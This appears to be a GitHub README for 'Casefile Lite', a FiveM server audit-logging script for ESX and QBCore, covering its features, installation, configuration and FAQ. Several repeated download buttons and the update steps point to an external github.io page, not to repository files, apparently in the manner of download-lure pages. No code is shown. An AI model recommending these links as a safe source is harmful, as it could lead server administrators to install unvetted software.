# Casefile Lite - Game Script Utility 2026

> **Integrity monitoring and investigation tools for FiveM servers.** Casefile Lite collects significant server activity, organizes it into searchable audit records, and helps administrators review operations across ESX and QBCore setups.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/isaac-hayessyz845/casefile-lite-lua-script?style=flat-square)](https://github.com/isaac-hayessyz845/casefile-lite-lua-script)

---

<p align="center">
  <a href="https://isaac-hayessyz845.github.io/casefile-lite-lua-script/">
    <img src="https://img.shields.io/badge/Download-Casefile%20Lite%20Script-brightgreen?style=for-the-badge" alt="Download Casefile Lite Script">
  </a>
</p>

> **[Download Casefile Lite](https://isaac-hayessyz845.github.io/casefile-lite-lua-script/)**

---

[Download Latest Build](https://isaac-hayessyz845.github.io/casefile-lite-lua-script/)

---

## What Casefile Lite Does

Casefile Lite is a FiveM integrity and investigation resource intended for GTA5 roleplay servers. It logs financial activity, item changes, administrator actions, and session events, making those entries available in an in-game panel with search tools.

Built for ESX and QBCore servers, the resource can write its collected records to the database already used by the server. Investigations can be focused by player, event type, or time period. Administrators may also mirror events to Discord through a webhook, while integrations can accept event data from anticheat resources and txAdmin.

---

## Included Capabilities

- Audit money-related activity for later examination
- Log item events and administrative operations
- Record server session activity
- Review captured events through an in-game searchable interface
- Refine results using player, category, and time filters
- Persist audit information in the configured server database
- Optionally copy selected events to a Discord webhook
- Ingest compatible events from anticheat resources and txAdmin
- Support both the ESX and QBCore frameworks

---

## Installation

1. Obtain the newest Casefile Lite build using the download link above.
2. Unpack the resource into the resources folder of your FiveM server.
3. Set the database connection and configure any integrations you plan to use.
4. Register the resource in `server.cfg`:

```cfg
ensure casefile
```

5. Restart the server, or launch the resource through the server console.
6. Check that Casefile Lite starts without errors and that the investigation panel receives events.

Configure the resource in conjunction with the framework and other resources that generate events on your server. For Discord forwarding, enter the webhook information in the resource configuration before starting the server.

---

## Configuration Areas

Setting names can differ between builds, so refer to the configuration included with your resource for the definitive list of options.

| Area | Purpose | Default handling |
|---|---|---|
| Event capture | Select the event categories recorded by Casefile Lite | Configure for the server's audit needs |
| Player filter | Narrow investigation results to a specific player | Applied from the in-game panel |
| Category filter | View money, item, admin, or session records separately | Applied from the in-game panel |
| Time range | Restrict results to a selected period | Applied during searches |
| Database storage | Save records to the server database | Uses the configured server database |
| Discord mirroring | Forward selected events to a Discord webhook | Optional |
| External ingestion | Receive events from anticheat resources and txAdmin | Enable and configure supported integrations |

---

## Compatibility and Requirements

- **Platform:** FiveM
- **Game:** GTA5
- **Frameworks:** ESX and QBCore
- **Integration sources:** Anticheat resources and txAdmin
- **Language environment:** Lua-based FiveM resources
- **Storage:** The server's configured database

Casefile Lite records the events made available by the framework and linked resources. The resulting coverage can vary according to server configuration, custom resources, anticheat implementations, and txAdmin setup. When deploying it on a customized server, check the supplied configuration and the requirements for each integration.

---

## 2026 Changelog

- Documentation for the current Lite release
- Audit coverage for money, item, administrator, and session events
- In-game investigation searches with filtering
- Compatibility with ESX and QBCore
- Optional Discord webhook mirroring and external event ingestion

---

## Frequently Asked Questions

### What are the installation steps?

Download the resource, move it into the server's resources directory, configure the database and integrations, and add `ensure casefile` to `server.cfg`.

### Where does Casefile Lite save its records?

The resource writes captured records to the server's configured database.

### Is it possible to search for one player or event category?

Yes. The in-game panel allows results to be narrowed by player, category, and time range.

### Are ESX and QBCore both supported?

Yes. Both frameworks are supported, although the available event data depends on the individual server configuration.

### How do I update the resource?

Follow the latest build link near the beginning of this README and replace the current resource files according to the release installation instructions. Retain any local configuration that must continue to be used.

### Can events be mirrored to Discord?

Yes, as an optional feature. Add the webhook details to the resource settings when Discord delivery is needed.

### Can data from anticheat resources and txAdmin be logged?

Casefile Lite supports event ingestion from anticheat resources and txAdmin when the appropriate integration is enabled and those systems provide compatible event data.

### What can be customized?

Available customization is determined by the resource configuration and by the events exposed from your framework and connected resources. Document local modifications so they can be restored after an update.

### Does Casefile Lite replace the database or framework?

No. It works with the server's existing database configuration and supports ESX or QBCore; it does not replace either one.

### Where should server-specific values be stored?

Place database, webhook, framework, and integration values specific to your server in the resource configuration included with the build. Keep private connection information and webhook URLs out of published files.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
